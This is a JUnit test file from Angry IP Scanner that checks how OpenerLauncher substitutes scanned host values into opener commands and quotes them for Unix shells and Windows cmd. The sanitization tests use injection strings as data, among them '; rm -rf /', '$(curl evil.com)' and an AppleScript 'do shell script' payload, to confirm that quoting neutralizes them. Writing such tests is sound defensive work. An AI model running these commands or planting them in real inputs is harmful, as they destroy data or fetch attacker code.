package net.azib.ipscan.gui.actions;

import net.azib.ipscan.config.Labels;
import net.azib.ipscan.config.Platform;
import net.azib.ipscan.core.ScanningResultList;
import net.azib.ipscan.core.UserErrorException;
import net.azib.ipscan.core.values.InetAddressHolder;
import net.azib.ipscan.core.values.IntegerWithUnit;
import net.azib.ipscan.core.values.NotAvailable;
import net.azib.ipscan.feeders.Feeder;
import net.azib.ipscan.fetchers.FetcherRegistry;
import net.azib.ipscan.fetchers.HostnameFetcher;
import net.azib.ipscan.fetchers.IPFetcher;
import net.azib.ipscan.fetchers.PingFetcher;
import org.junit.Test;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Collections;

import static org.junit.Assert.*;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * OpenerLauncherTest
 *
 * @author Anton Keks
 */
public class OpenerLauncherTest {
	@Test
	public void testReplaceValues() throws UnknownHostException {
		var fetcherRegistry = mock(FetcherRegistry.class);
		when(fetcherRegistry.getSelectedFetchers()).thenReturn(Collections.nCopies(5, null));
		when(fetcherRegistry.getSelectedFetcherIndex(IPFetcher.ID)).thenReturn(0);
		when(fetcherRegistry.getSelectedFetcherIndex(HostnameFetcher.ID)).thenReturn(1);
		when(fetcherRegistry.getSelectedFetcherIndex(PingFetcher.ID)).thenReturn(2);
		when(fetcherRegistry.getSelectedFetcherIndex("fetcher.comment")).thenReturn(3);
		when(fetcherRegistry.getSelectedFetcherIndex("noSuchFetcher")).thenReturn(-1);
		// the comment fetcher is registered (just hidden by default in this mock), unlike the typo below
		when(fetcherRegistry.isRegisteredFetcher("fetcher.comment")).thenReturn(true);

		var scanningResults = new ScanningResultList(fetcherRegistry);
		scanningResults.initNewScan(mockFeeder("info"));
		var result = scanningResults.createResult(InetAddress.getByName("127.0.0.1"));
		result.setValue(0, new InetAddressHolder(InetAddress.getByName("127.0.0.1")));
		result.setValue(1, "HOSTNAME");
		result.setValue(2, new IntegerWithUnit(10, "ms"));
		scanningResults.registerAtIndex(0, result);

		var ol = new OpenerLauncher(fetcherRegistry, scanningResults);
		
		// sanitize=false: raw substitution (used for URL openers)
		assertEquals("\\\\127.0.0.1", ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, false));
		assertEquals("HOSTNAME$$$127.0.0.1xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, false));
		assertEquals("http://127.0.0.1:80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, false));
		assertEquals(result.getValues().get(2) + ", xx", ol.prepareOpenerStringForItem("${fetcher.ping}, xx", 0, false));

		// sanitize=true: values wrapped in quotes suitable for the platform's shell
		assertEquals("\\\\" + q("127.0.0.1"), ol.prepareOpenerStringForItem("\\\\${fetcher.ip}", 0, true));
		assertEquals(q("HOSTNAME") + "$$$" + q("127.0.0.1") + "xxx${}", ol.prepareOpenerStringForItem("${fetcher.hostname}$$$${fetcher.ip}xxx${}", 0, true));
		assertEquals("http://" + q("127.0.0.1") + ":80/www", ol.prepareOpenerStringForItem("http://${fetcher.ip}:80/www", 0, true));
				
		try {
			ol.prepareOpenerStringForItem("${noSuchFetcher}", 0, false);
			fail();
		}
		catch (UserErrorException e) {
			assertEquals(Labels.getLabel("exception.UserErrorException.opener.unknownFetcher") + "noSuchFetcher", e.getMessage());
		}

		// missing fetcher value now falls back to the IP instead of throwing
		assertEquals("127.0.0.1", ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false));

		result.setValue(3, NotAvailable.VALUE);
		assertEquals("127.0.0.1", ol.prepareOpenerStringForItem("${fetcher.comment}", 0, false));
		
		result.setValue(1, null);
		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
		assertEquals("Hostname opening should fall back to the IP", q("127.0.0.1"), ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, true));
		result.setValue(1, NotAvailable.VALUE);
		assertEquals("Hostname opening should fall back to the IP", "127.0.0.1", ol.prepareOpenerStringForItem("${" + HostnameFetcher.ID + "}", 0, false));
	}

	/** quotes a value the way the current platform's shell does */
	private static String q(String value) {
		return Platform.WINDOWS ? "\"" + value + "\"" : "'" + value + "'";
	}
	
	@Test
	public void testSanitizeForShell() {
		// normal values are wrapped in single quotes
		assertEquals("'hostname'", OpenerLauncher.sanitizeForShell("hostname"));
		assertEquals("'192.168.1.1'", OpenerLauncher.sanitizeForShell("192.168.1.1"));

		// empty value
		assertEquals("''", OpenerLauncher.sanitizeForShell(""));

		// single quotes inside the value are escaped
		assertEquals("'it'\\''s'", OpenerLauncher.sanitizeForShell("it's"));

		// shell metacharacters are neutralized inside single quotes
		assertEquals("'; rm -rf /'", OpenerLauncher.sanitizeForShell("; rm -rf /"));
		assertEquals("'$(curl evil.com)'", OpenerLauncher.sanitizeForShell("$(curl evil.com)"));
		assertEquals("'`id`'", OpenerLauncher.sanitizeForShell("`id`")); // backticks are literal inside ''
		assertEquals("'a|b&c>d<e'", OpenerLauncher.sanitizeForShell("a|b&c>d<e"));

		// Windows cmd metacharacters are also neutralized
		assertEquals("'a&b|c>d^e%'", OpenerLauncher.sanitizeForShell("a&b|c>d^e%"));

		// AppleScript injection attempt
		assertEquals("'\" & do shell script \"evil\" & \"'", OpenerLauncher.sanitizeForShell("\" & do shell script \"evil\" & \""));
	}

	@Test
	public void testSanitizeForCmd() {
		// normal values are wrapped in double quotes (cmd.exe ignores single quotes!)
		assertEquals("\"hostname\"", OpenerLauncher.sanitizeForCmd("hostname"));
		assertEquals("\"192.168.1.1\"", OpenerLauncher.sanitizeForCmd("192.168.1.1"));

		// empty value
		assertEquals("\"\"", OpenerLauncher.sanitizeForCmd(""));

		// embedded double quotes are escaped cmd-style
		assertEquals("\"it\"\"s\"", OpenerLauncher.sanitizeForCmd("it\"s"));

		// cmd metacharacters are neutralized inside double quotes
		assertEquals("\"a&b|c>d<e\"", OpenerLauncher.sanitizeForCmd("a&b|c>d<e"));
		assertEquals("\"'; rm -rf /'\"", OpenerLauncher.sanitizeForCmd("'; rm -rf /'"));
	}

	@Test
	public void testCommandSplitting() throws Exception {
		assertArrayEquals(new String[] {"hello", "world"}, OpenerLauncher.splitCommand("hello world"));
		assertArrayEquals(new String[] {"echo", "hello world", "muha-ha"}, OpenerLauncher.splitCommand("echo 'hello world' muha-ha"));
		assertArrayEquals(new String[] {"echo", "hello world", "muha-ha"}, OpenerLauncher.splitCommand("echo \"hello world\" muha-ha"));
		assertArrayEquals(new String[] {"mix \"1", "mix '2"}, OpenerLauncher.splitCommand("'mix \"1' \"mix '2\""));
		assertArrayEquals(new String[] {"\"aaa"}, OpenerLauncher.splitCommand("\"aaa"));
	}
	
	private Feeder mockFeeder(String feederInfo) {
		var feeder = mock(Feeder.class);
		when(feeder.getInfo()).thenReturn(feederInfo);
		when(feeder.getName()).thenReturn("feeder.range");
		return feeder;
	}
}
